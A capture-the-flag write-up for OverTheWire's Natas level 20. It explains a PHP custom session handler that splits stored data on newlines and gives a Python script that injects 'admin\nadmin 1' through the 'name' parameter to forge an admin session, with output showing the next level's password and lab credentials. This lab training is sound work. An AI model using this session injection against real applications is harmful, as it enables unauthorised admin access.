# Natas20

*	user: `natas20`
*	pass: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`
*	url: [http://natas20.natas.labs.overthewire.org](http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org)
*	flag: `IFekPyrQXftziDEsUr3x21sYuahypdgJ`

## Procedure

1.	In this level it's realistic to say that session ID cannot be predicted.
	Indeed, it seems to be totally random.

2.	By taking a look in the source code, we can see that custom handlers for
	session storing management were defined. In our case the intersing ones are
	`myread()` and `mywrite()`.

3.	In `myread()` we can see that session file's content is split by using
	`\n` (newline) as separator character.

		$_SESSION = array();
		foreach(explode("\n", $data) as $line) {
			debug("Read [$line]");
			...
		}

	Furthermore, to fill the `$_SESSION` array, each line is expected to be in
	the form `key value`

		$_SESSION = array();
		foreach(explode("\n", $data) as $line) {
			...
			$parts = explode(" ", $line, 2);
			if($parts[0] != "")
				$_SESSION[$parts[0]] = $parts[1];
		}

4.	To get authenticated as `admin`, page checks if session contains the `admin`
	key and if its value in `1`.

		function print_credentials() { /* {{{ */
			if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
				print "You are an admin. The credentials for the next level are:<br>";
				print "<pre>Username: natas21\n";
				print "Password: <censored></pre>";
			} else {
				print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
			}
		}

5.	When parameter called `name` is posted, a new session is initialised and
	value of `name` is stored on it (without being sanitised!!!).

6.	Few lines of Python ([natas20.py](./scripts/natas20.py)) will do the attack

		import requests

		target = 'http://natas20.natas.labs.overthewire.org'
		auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

		print "#"
		print "# FIRST REQUEST"
		print "#"
		params = dict(name='admin\nadmin 1', debug='') # <-- this is the key part
		#             ^^^^^^^^^^^^^^^^^^^^^
		cookies = dict()
		r = requests.get(target, auth=auth, params=params, cookies=cookies)
		phpsessid = r.cookies['PHPSESSID']
		print r.text

		print "\n\n"
		print "#"
		print "# SECOND REQUEST"
		print "#"
		params = dict(debug='')
		cookies = dict(PHPSESSID=phpsessid)
		r = requests.get(target, auth=auth, params=params, cookies=cookies)
		print r.text

	In practice, we'll inject the `admin` parameter via the `name` parameter.

		$ pyton natas20.py
		#
		# FIRST REQUEST
		#
		<html>

		[cut]

		<body>
		<h1>natas20</h1>
		<div id="content">
		DEBUG: MYREAD 3ja0006ku6rh8birk8i66nlrr5<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin
		admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.

		[cut]

		DEBUG: MYWRITE 3ja0006ku6rh8birk8i66nlrr5 name|s:13:"admin
		admin 1";<br>DEBUG: Saving in /var/lib/php5/mysess_3ja0006ku6rh8birk8i66nlrr5<br>DEBUG: name => admin
		admin 1<br>

		#
		# SECOND REQUEST
		#
		<html>

		[cut]

		<body>
		<h1>natas20</h1>
		<div id="content">
		DEBUG: MYREAD 3ja0006ku6rh8birk8i66nlrr5<br>DEBUG: Reading from /var/lib/php5/mysess_3ja0006ku6rh8birk8i66nlrr5<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
		Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>

		[cut]



